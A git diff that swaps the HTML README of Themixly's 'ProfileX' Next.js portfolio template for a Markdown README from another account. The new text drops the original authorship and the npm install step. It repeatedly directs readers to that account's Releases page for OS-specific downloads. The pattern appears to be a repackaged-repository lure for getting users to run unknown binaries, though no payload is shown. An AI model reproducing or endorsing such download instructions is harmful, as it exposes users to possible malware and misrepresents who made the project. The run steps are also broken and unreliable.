@@ -1,144 +1,96 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <meta name="description" content="A morden React & Next.js portfolio template for designers, developers, and creatives — built with Tailwind CSS for speed, modern design, and responsiveness." />
-  <meta name="keywords" content="React portfolio template, Next.js portfolio template, designer portfolio, developer portfolio, freelancer landing page, UI/UX designer portfolio, personal branding website, Tailwind CSS portfolio" />
-  <meta name="author" content="Themixly Web" />
-  <link rel="canonical" href="https://themixly.com/themes/portfolio-react-nextjs-template/" />
-</head>
-<body>
+# 🎨 nextjs-portfolio-website-template - A Modern Portfolio for Creatives
 
-<h1>🚀 ProfileX – React & Next.js Portfolio Template for Designers, Developers & Creatives</h1>
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/nicolas686/nextjs-portfolio-website-template/releases)
 
-<h2>Introduction</h2>
-<p>ProfileX is a sleek, one-page <strong>React & Next.js</strong> portfolio template designed for designers, developers, and freelancers. Built with React 19+, Next.js 15+, and Tailwind CSS, it’s fast, responsive, and SEO-optimized for personal branding and portfolio websites.</p>
+## 🚀 Getting Started
 
-<h2>🔗 Live Preview</h2>
-<ul>
-  <li>🚀 <a href="https://themixly.com/preview/2067/portfolio-react-nextjs-template/" target="_blank">Live Demo – ProfileX Template</a></li>
-  <li>🛒 <a href="https://themixly.com/themes/portfolio-react-nextjs-template/" target="_blank">Buy Full Version on Themixly</a></li>
-</ul>
+Welcome to the nextjs-portfolio-website-template! This template helps designers, developers, and creatives build a beautiful, responsive portfolio website quickly. Follow these steps to download and run the application.
 
-<h2>🧩 Feature Comparison: GitHub Free vs Themixly Pro</h2>
-<table>
-  <thead>
-    <tr><th>Feature</th><th>GitHub Free Version</th><th>Themixly Full Version</th></tr>
-  </thead>
-  <tbody>
-    <tr><td>React 19+, Next.js 15+</td><td>✅</td><td>✅</td></tr>
-    <tr><td>One-page Layout</td><td>✅</td><td>✅</td></tr>
-    <tr><td>Profile & Intro Section</td><td>✅</td><td>✅</td></tr>
-    <tr><td>Project Showcase Section</td><td>❌</td><td>✅</td></tr>
-    <tr><td>Testimonial Section</td><td>❌</td><td>✅</td></tr>
-    <tr><td>Design Service Section</td><td>❌</td><td>✅</td></tr>
-    <tr><td>Contact Form</td><td>❌</td><td>✅</td></tr>
-    <tr><td>Responsive for All Devices</td><td>✅</td><td>✅</td></tr>
-    <tr><td>Custom Components</td><td>Limited</td><td>Full UI Kit Included</td></tr>
-    <tr><td>Lifetime Updates</td><td>Community Only</td><td>Lifetime Free Updates</td></tr>
-    <tr><td>Licensing</td><td>MIT (Free)</td><td>Commercial Use Allowed</td></tr>
-    <tr><td>Premium Support</td><td>Community via GitHub</td><td>1:1 Support via Email</td></tr>
-  </tbody>
-</table>
+## 📥 Download & Install
 
-<h3>👉 <a href="https://themixly.com/themes/portfolio-react-nextjs-template/" target="_blank">Go Premium for Full Features</a></h3>
+To get started, you need to download the template from the Releases page. Click the link below:
 
-<h2>🧠 Template Use Cases</h2>
-<p>ProfileX is perfect for:</p>
-<ul>
-  <li>Personal Portfolio Websites</li>
-  <li>Designer or Developer Profile Sites</li>
-  <li>Freelancer Landing Pages</li>
-  <li>Resume or CV Websites</li>
-  <li>Creative Agency or Studio Portfolios</li>
-  <li>UI/UX Designer Showcase Pages</li>
-</ul>
+[Download from Releases](https://github.com/nicolas686/nextjs-portfolio-website-template/releases)
 
-<h2>💡 Key Features</h2>
-<ul>
-  <li>Built with React 19+, Next.js 15+</li>
-  <li>Responsive grid layout with clean sections</li>
-  <li>Smooth animations and modern portfolio UI</li>
-  <li>Pre-styled sections: Home, Projects, Testimonial, Contact</li>
-  <li>SEO-friendly and optimized structure</li>
-  <li>Fast-loading with lightweight performance</li>
-  <li>Easily customizable for designers and developers</li>
-  <li>One-page layout for smooth navigation</li>
-</ul>
+1. Visit the Releases page using the link above.
+2. Find the latest version listed at the top of the page. 
+3. Click on the version number to view the release details.
+4. Look for the release asset that matches your operating system. If you're using Windows, choose the file labeled for Windows. For Mac or Linux, select the appropriate file.
+5. Once you click the asset, your download will begin automatically.
 
-<h2>📸 Screenshots</h2>
-<figure>
-  <figcaption>Includes sections like Project Showcase, Testimonial, Design Service, Contact Form.</figcaption><br/>
-  <img src="https://themixly.com/wp-content/uploads/2025/08/Artboard-2-3-scaled.jpg" alt="ProfileX – Portfolio Page Preview">
-</figure>
+## 📁 How to Run the Template
 
-<h2>✨ Why Choose ProfileX?</h2>
-<ul>
-  <li>Crafted for designers, developers, and creative professionals</li>
-  <li>Modern UI that highlights your personal brand</li>
-  <li>Clean, modular code with Tailwind CSS styling</li>
-  <li>SEO-optimized for portfolio visibility</li>
-  <li>Built for speed, scalability, and simplicity</li>
-  <li>Mobile-first and retina-ready for a premium experience</li>
-</ul>
+After downloading, follow these steps to set up and run your new portfolio template:
 
-<h2>🛠️ Tech Stack</h2>
-<ul>
-  <li>🧩 React 19+</li>
-  <li>🌐 Next.js 15+</li>
-  <li>🌀 Tailwind CSS</li>
-  <li>⚙️ HTML, CSS, JavaScript (React JSX)</li>
-</ul>
+### 1. Extract the Files
 
-<h2>🚀 Getting Started</h2>
-<pre><code>npm install       # Install dependencies
-npm run dev       # Start development server
-npm run build     # Build for production
-</code></pre>
+Locate the downloaded file in your downloads folder. It will usually be compressed (like a ZIP file). 
 
-<h3>📁 Folder Structure</h3>
-<pre><code>ProfileX/
-├── components/
-├── pages/
-├── public/
-├── scss/
-├── styles/
-├── README.md
-└── package.json
-</code></pre>
+- **Windows:** Right-click on the file and choose "Extract All." Follow the prompts to extract the files to a new folder.
+- **Mac:** Double-click the file to extract its contents.
+- **Linux:** Use your preferred archive manager, or run `unzip filename.zip` in the terminal.
 
-<h2>📦 What’s Included in the Free GitHub Version?</h2>
-<ul>
-  <li>✅ Profile Section</li>
-  <li>✅ About Section (Intro)</li>
-  <li>✅ Facts Section</li>
-  <li>✅ Cards Section</li>
-  <li>✅ Clean Tailwind CSS styling</li>
-  <li>✅ Static content setup – easily editable</li>
-</ul>
-<p>🔒 Full features like blog section, testimonials, services, resume page, contact form, and more are available in the premium version.</p>
-<p>👉 <a href="https://themixly.com/themes/portfolio-react-nextjs-template/" target="_blank">Upgrade Now – Full Version on Themixly</a></p>
+### 2. Open the Folder
 
-<h2>📝 License</h2>
-<p>This template is licensed under the <a href="https://github.com/themixlyweb/nextjs-portfolio-website-template/blob/main/LICENSE" target="_blank">MIT License</a>.<br/>
-You may use this version for personal and educational purposes.</p>
+Navigate to the folder where you extracted the contents. You should see several files and folders that start with "nextjs-portfolio-website-template."
 
-<h2>📢 Support & Contributions</h2>
-<ul>
-  <li>⭐ Star this repo if you find it useful</li>
-  <li>Share with your developer community</li>
-  <li>Want full features & commercial license?</li>
-  <li>👉 Get Full Access on <a href="https://themixly.com/" target="_blank">Themixly</a></li>
-</ul>
+### 3. Open the Application
 
-<h2>🧾 Contact Us</h2>
-<p>Need support or custom development?<br/>
-📩 <a href="https://themixly.com/contact-us/" target="_blank">Contact Themixly Team</a></p><br/>
+To run the application, you need to use a terminal (command line interface). Here's how:
 
-<footer>
-  © 2025 Themixly. All rights reserved. | Built with ❤️ for developers & designers.
-</footer>
+- **Windows:**
+  1. Open the Command Prompt by typing `cmd` in the search bar.
+  2. Type `cd path_to_your_folder` (replace "path_to_your_folder" with the actual path).
+  3. Type `npm run dev` and hit Enter.
 
-</body>
-</html>
+- **Mac/Linux:**
+  1. Open Terminal.
+  2. Type `cd path_to_your_folder` (replace "path_to_your_folder" with the actual path).
+  3. Type `npm run dev` and hit Enter.
+
+### 4. View the Portfolio
+
+Once the application runs, open your web browser and go to `http://localhost:3000`. You will see your new portfolio website live!
+
+## 🌟 Features
+
+This template includes:
+
+- **Modern Design:** A sleek and up-to-date interface built with Tailwind CSS.
+- **Responsive Layout:** The site looks great on both desktop and mobile devices.
+- **SEO Optimized:** Helps your portfolio stand out in search results.
+- **Easy Customization:** Change colors, fonts, and sections with simple edits.
+
+## 🖥️ System Requirements
+
+To run this application, you will need:
+
+- A computer with a modern web browser (Chrome, Firefox, Safari, etc.).
+- Node.js installed. Download it from [Node.js official site](https://nodejs.org/).
+- Basic knowledge of using command line tools is helpful but not necessary.
+
+## 📚 Additional Resources
+
+To help you customize your portfolio, we've included links to helpful resources:
+
+- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
+- [Next.js Documentation](https://nextjs.org/docs)
+- [React Documentation](https://reactjs.org/docs/getting-started.html)
+
+For more examples of what you can build using this template, refer to the following topics:
+
+- **Creative Template**
+- **Designer Portfolio**
+- **Developer Portfolio**
+- **Freelancer Template** 
+
+## 📬 Support
+
+If you have any questions or run into issues, feel free to open an issue on this repository. We will do our best to assist you.
+
+## 🔗 Useful Links
+
+- [Repository Home](https://github.com/nicolas686/nextjs-portfolio-website-template)
+- [Download from Releases](https://github.com/nicolas686/nextjs-portfolio-website-template/releases)
+
+Thank you for using the nextjs-portfolio-website-template! We hope you enjoy building your portfolio.
